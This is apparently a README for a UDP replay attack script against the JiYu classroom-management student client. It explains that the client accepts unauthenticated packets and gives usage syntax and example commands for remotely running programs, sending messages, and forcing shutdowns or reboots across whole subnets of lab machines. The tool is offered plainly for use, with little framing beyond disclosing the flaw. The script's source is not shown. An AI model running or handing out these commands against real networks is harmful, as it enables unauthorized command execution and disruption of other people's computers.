
# 极域电子教室数据包(udp)重放攻击脚本
+ 因为极域的学生端没有对接收到的udp包做(=・ω・=)身份验证，导致了我们可以构造特定的数据包让学生端来执行，从而实现命令执行攻击机房内上线的任意学生端机器。
## 运行环境
+ Python3

## 使用方法：
```
    Usage: Jiyu_udp_attack.py -ip ip_address -p port -msg/-c/-r/-s xxx

        -ip   ip addres IP地址                 example:   -ip   192.168.80.23
                                                                192.168.80.122/24
        -p    port, default = 4705 端口，默认为4705

        -msg  send message 发送消息                        -msg  HelloWord!

        -c    command 命令                                 -c   "cmd.exe /c ipconfig" 
                                                                calc.exe
        -r    reboot 重启

        -s    shutdown 关机

        -l    loop * times, default = 1 循环次数，默认为1

        -t    loop interval, default = 22 s 循环时间间隔，默认是22秒
        
        -g    single options, Gets the current Intranet IP and student 
              client possible ports. 
              独立选项，获取当前的ip地址以及学生端监听的端口。
              If choose this options, other are become invalid. 
              如果选择了这个选项，其他选项将会失效。
          
```

## 使用例子

### 获取内网ip地址
```
python Jiyu_udp_attack.py -g
```

### 发送消息
向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -p -msg "hello,baby!"

```

### 执行命令
给192.168.80.12到192.168.80.137弹一个计算器
```
python Jiyu_udp_attack.py -ip 192.168.80.12-137 -p -c calc.exe
```

### 关机重启
关机
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -p -s
```
重启
```
python Jiyu_udp_attack.py -ip 192.168.80.12 -p -r
```

### 循环
利用循环持续发送消息<br>
1-254的机器会收到一条"hello,baby!"的消息，50s后会继续执行，共执行3次
```
    python Jiyu_udp_attack.py -ip 192.168.80.23/24 -p -msg "hello,baby!" -l 3 -t 50
```

    



